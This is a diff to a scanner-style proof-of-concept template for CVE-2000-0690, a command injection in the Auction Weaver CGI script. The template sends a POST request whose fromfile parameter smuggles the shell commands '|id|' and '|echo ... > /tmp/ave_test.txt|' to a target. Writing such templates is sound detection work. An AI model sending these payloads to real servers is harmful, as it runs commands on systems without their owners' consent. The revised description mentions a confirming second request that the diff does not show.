@@ -1,10 +1,15 @@
 [info]
 author = "AVE"
-description = "检测目标 Auction Weaver 1.0.2 CGI 脚本是否存在 fromfile 参数命令注入漏洞，通过 POST 请求向 /cgi-bin/awl/auctionweaver.pl 发送包含 shell 元字符的 payload，验证远程命令执行"
+description = "通过向 Auction Weaver CGI 脚本 auctionweaver.pl 的 fromfile 参数注入 shell 元字符，验证远程命令执行漏洞。发送包含管道符的 POST 请求，执行 echo 命令并将结果写入可访问路径，通过二次请求确认命令执行成功。"
 id = "POC-AVE-2000-0541"
-name = "CVE-2000-0690 PoC"
+name = "CVE-2000-0690 Auction Weaver CGI Remote Command Execution PoC"
 severity = "critical"
-tags = ["cve-2000-0690"]
+tags = [
+    "cve-2000-0690",
+    "rce",
+    "cgi",
+    "command-injection",
+]
 vuln_id = [
     "CVE-2000-0690",
     "AVE-2000-0541",
@@ -19,7 +24,7 @@ path = "/{{BaseURL}}/cgi-bin/awl/auctionweaver.pl"
 protocol = "http"
 
 [poc.requests.body]
-content = "flag1=1&fromfile=%7Cid%7C&placebid=1&catdir=cat1&username=test&password=test&bid=1&nobiditem=1&sbutton=BID"
+content = "flag1=1&fromfile=%7Cecho+AVE_TEST%3E/tmp/ave_test.txt%7C&placebid=1&catdir=cat1&username=teleh0r&password=ohbaby&bid=Ihavenomoney&nobiditem=1&sbutton=BID"
 type = "raw"
 
 [poc.requests.headers]
@@ -28,6 +33,8 @@ User-Agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = ["uid="]
+status = [
+    200,
+    302,
+]
+type = "status"
